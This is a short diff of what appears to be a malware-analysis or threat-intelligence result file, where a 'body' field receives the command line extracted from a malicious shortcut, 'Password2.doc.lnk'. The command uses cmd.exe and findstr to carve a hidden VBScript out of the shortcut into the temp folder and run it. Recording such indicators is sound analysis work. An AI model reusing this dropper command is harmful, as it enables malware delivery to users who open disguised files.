@@ -66,7 +66,7 @@
       },
       {
         "auto_collapse": false,
-        "body": null,
+        "body": "..\\..\\Windows\\system32\\cmd.exe /v:on /c findstr \"rSIPPswjwCtKoZy.*\" Password2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\"",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
